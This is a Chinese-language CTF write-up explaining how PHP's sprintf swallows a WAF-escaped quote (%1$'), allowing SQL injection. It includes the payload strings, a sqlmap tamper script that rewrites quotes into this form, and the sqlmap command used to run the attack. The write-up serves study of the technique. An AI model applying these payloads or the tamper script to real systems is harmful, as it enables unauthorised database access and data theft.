---
title: sprintf格式逃逸注入
date: 2018-09-08 18:27:35
categories: ctf
tag: sql注入
---

# 格式化漏洞

## 题目描述

sql注入 + % 报错  
![1536150551652](1.png)

## 题目分析

### 格式化注入漏洞

在php调用`sprintf`函数时,如果 参数的数量少于 `%`数量,会报错.

```php
$sql = "select * from user where username = '%\' and 1=1#' and password='%s';";
$args = "admin";
echo sprintf( "select * from user where username = '%\' and 1=1#' and password='%s';", $args) ;
// 报错
echo "<br>";
$sql = "select * from user where username = '%1$\' and 1=1#' and password='%s';";
$args = "admin";
echo sprintf( "select * from user where username = '%1$\' and 1=1#' and password='%s';", $args) ;
//select * from user where username = '' and 1=1#' and password='admin';
```

其中通过`%'`会先被waf过滤为`%\'`然后,`sprintf`会把`%\`吞掉.其中`%1$'`原理一样.

但是不知道为什么,<font color='red'>`%'`会报错. </font>而`%1$'`<font color='red'>不会报错 </font>.

## 解决

构造参数 `admin%1$' or 1=1` 与 `admin$1' or 1=2`存在报错注入.可以通过sqlmap编写 tamper 去跑.

### 编写tamper

```python
# -*- coding: utf-8 -*-

# !/usr/bin/env python
"""
v0.0.1
2018.3.30
filename: sprintf.py
"""

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    通过格式化字符串漏洞来完成对单引号的闭合
    """
    return payload.replace("'", "%1$'")
```

然后执行

```bash
sqlmap -r “request.txt” -p username –level 3 –dbms mysql –tamper sprintf.py
```

